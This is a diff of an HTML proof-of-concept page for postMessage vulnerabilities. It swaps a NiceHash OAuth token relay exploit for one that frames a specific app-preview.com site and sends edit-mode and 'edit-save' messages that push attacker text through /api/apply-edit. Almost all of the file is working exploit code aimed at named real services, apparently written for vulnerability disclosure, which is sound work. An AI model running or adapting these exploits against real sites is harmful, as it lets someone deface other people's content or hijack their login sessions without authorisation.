@@ -1,50 +1,78 @@
 <!DOCTYPE html>
-  <html>
-  <body>
-  <h3>NiceHash postMessage Relay PoC</h3>
-  <textarea id="code" rows="3" cols="60" placeholder="Paste fresh code here"></textarea><br>
-  <textarea id="token" rows="5" cols="60" placeholder="Paste fresh id_token here"></textarea><br>
-  <button onclick="run()">Run PoC</button>
-  <pre id="log"></pre>
+<html>
+<head>
+  <title>PoC - Hostinger app-preview postMessage no origin check</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
+    #log { background: #000; padding: 10px; height: 200px; overflow-y: auto; border: 1px solid #0f0; }
+    iframe { width: 100%; height: 500px; border: 2px solid red; }
+    button { background: #0f0; color: #000; border: none; padding: 8px 16px; margin: 4px; cursor: pointer; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h2>PoC: app-preview.com postMessage — no origin check</h2>
+  <p>Origin of THIS page: <strong id="origin"></strong></p>
+  <p>Target iframe: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong></p>
+
+  <div>
+    <button onclick="sendMsg('enable-edit-mode')">1. Send enable-edit-mode</button>
+    <button onclick="sendMsg('enableSelectionMode')">2. Send enableSelectionMode</button>
+    <button onclick="sendEditSave()">3. Send edit-save</button>
+    <button onclick="sendMsg('disable-edit-mode')">4. Send disable-edit-mode</button>
+    <button onclick="sendAll()">RUN ALL (auto)</button>
+  </div>
+
+  <div id="log"></div>
+
+  <iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>
 
   <script>
-  function run() {
-    const code  = document.getElementById('code').value.trim();
-    const token = document.getElementById('token').value.trim();
-    if (!code || !token) { log('[-] Paste the code and token first'); return; }
+    document.getElementById('origin').textContent = window.location.origin;
 
-    log('[+] Opening NiceHash login from origin: ' + location.origin);
-    const w = window.open('https://test.nicehash.com/my/login', '_blank',
-      'width=700,height=800,left=200,top=50');
+    const log = (msg) => {
+      const el = document.getElementById('log');
+      const ts = new Date().toISOString().split('T')[1].slice(0,8);
+      el.innerHTML += `[${ts}] ${msg}<br>`;
+      el.scrollTop = el.scrollHeight;
+      console.log('[POC]', msg);
+    };
 
-    if (!w) { log('[-] Popup blocked! Allow popups for this page.'); return; }
+    const iframe = document.getElementById('target');
 
-    // Keep sending until the Vue component mounts and listener registers
-    let sent = false;
-    const interval = setInterval(() => {
-      try {
-        w.postMessage(JSON.stringify({
-          method: 'oauthDone',
-          data: {
-            authorization: { code, id_token: token, state: 'login' }
-          }
-        }), '*');
+    function sendMsg(type, payload) {
+      const msg = payload ? { type, payload } : { type };
+      iframe.contentWindow.postMessage(msg, '*');
+      log(`SENT → type="${type}" payload=${JSON.stringify(payload || null)}`);
+    }
 
-        if (!sent) {
-          log('[+] postMessage sent from ' + location.origin + ' → NiceHash');
-          log('[+] Watch NiceHash window → DevTools → Network → apple-callback');
-          sent = true;
-        }
-      } catch(e) { log('[-] Error: ' + e.message); }
-    }, 500);
+    function sendEditSave() {
+      // Send edit-save - triggers handleEditSave() → POST /api/apply-edit
+      sendMsg('edit-save', { newText: 'PWNED BY ATTACKER - postMessage no origin check' });
+    }
 
-    setTimeout(() => {
-      clearInterval(interval);
-      log('[+] Done sending. Check the NiceHash window network tab.');
-    }, 10000);
-  }
+    function sendAll() {
+      log('--- Starting attack sequence ---');
+      setTimeout(() => sendMsg('enable-edit-mode'), 500);
+      setTimeout(() => sendMsg('enableSelectionMode'), 1500);
+      setTimeout(() => sendEditSave(), 3000);
+      setTimeout(() => {
+        log('--- Sequence complete. Check /api/apply-edit in network tab ---');
+      }, 3500);
+    }
 
-  function log(m) { document.getElementById('log').textContent += m + '\n'; }
+    // Listen for any messages coming BACK from the iframe
+    window.addEventListener('message', (event) => {
+      if (event.origin.includes('app-preview')) {
+        log(`RECEIVED ← origin="${event.origin}" type="${event.data?.type}" data=${JSON.stringify(event.data).slice(0,200)}`);
+      }
+    });
+
+    iframe.addEventListener('load', () => {
+      log('iframe loaded ✓ — ready to send messages');
+    });
+
+    log('PoC loaded. Iframe embedding app-preview from foreign origin.');
+    log('This origin is NOT in ALLOWED_PARENT_ORIGINS — but edit-save has no check!');
   </script>
-  </body>
-  </html>
+</body>
+</html>
